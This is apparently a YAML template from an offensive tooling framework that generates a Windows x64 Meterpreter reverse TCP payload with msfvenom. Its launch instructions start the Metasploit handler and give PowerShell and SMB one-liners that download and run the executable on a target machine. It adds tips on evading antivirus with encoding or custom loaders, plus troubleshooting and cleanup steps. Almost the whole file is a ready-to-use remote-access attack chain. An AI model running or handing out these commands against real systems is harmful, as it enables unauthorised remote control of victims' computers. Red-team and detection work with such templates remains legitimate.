meta:
  name: "Basic Msfvenom Reverse TCP Shell"
  category: ""
  description: |
    Generates a basic Windows reverse TCP Meterpreter payload using msfvenom.
    This is a staged payload that connects back to the attacker's listener.

    Staged payloads are smaller in size but require a multi-step delivery process.
    The initial stager downloads the full Meterpreter payload from the handler.

    Note: This uses default msfvenom signatures and will likely be detected
    by modern antivirus solutions without additional obfuscation.

  effectiveness: low

  mitre:
    tactic: "TA0002 - Execution"
    technique: "T1059.003 - Command and Scripting Interpreter: Windows Command Shell"

  artifacts:
    - "Metasploit framework signatures in binary"
    - "Outbound TCP connection to LHOST:LPORT"
    - "Known msfvenom payload patterns"
    - "Meterpreter DLL in memory after staging"

parameters:
  - name: "lhost"
    type: "ip"
    description: "Attacker's IP address for reverse connection"
    required: true

  - name: "lport"
    type: "port"
    description: "Attacker's listening port"
    required: true
    default: 4444

  - name: "output_file"
    type: "string"
    description: "Output executable filename"
    required: true
    default: "payload.exe"

  - name: "output_path"
    type: "path"
    description: "Output directory for generated payload"
    required: true
    default: "{config.output_dir}"

preprocessing: []

output:
  type: "command"
  command: "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={{ lhost }} LPORT={{ lport }} -f exe -o {{ output_path }}/{{ output_file }}"

  launch_instructions: |
    # Start Listener
    ```bash
    msfconsole -x "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST {{ lhost }}; set LPORT {{ lport }}; set ExitOnSession false; exploit -j"
    ```

    # Transfer and Execute

    ## HTTP Method
    **Attacker:**
    ```bash
    python3 -m http.server 8000
    ```

    **Target:**
    ```powershell
    powershell -c "IWR -Uri http://{{ lhost }}:8000/{{ output_file }} -OutFile {{ output_file }}; .\{{ output_file }}"
    ```

    ## Alternative (SMB)
    **Attacker:**
    ```bash
    impacket-smbserver share . -smb2support
    ```

    **Target:** 
    ```cmd
    copy \\{{ lhost }}\share\{{ output_file }} {{ output_file }} && {{ output_file }}
    ```

    # Notes
    - **Staged payload**: Requires network connectivity to `{{ lhost }}:{{ lport }}` to download full Meterpreter DLL
    - `EXITFUNC=thread` ensures clean exit without crashing process
    - Windows Defender and most AV will detect this immediately (unobfuscated msfvenom payload)
    - Consider encoding, packing, or custom loaders for real engagements
    - Session should appear in msfconsole: "Meterpreter session X opened"

    # Troubleshooting
    - **No connection**: Check firewall rules on attacker machine (allow `{{ lport }}/tcp`)
    - **Connection drops immediately**: AV likely killed the process
    - **"Connection refused"**: Listener not running or wrong LHOST/LPORT
    - **Payload won't execute**: Windows SmartScreen or AV blocking execution

    # Cleanup
    **On target:**
    ```cmd
    taskkill /F /IM {{ output_file }} 2>nul
    del {{ output_file }}
    ```
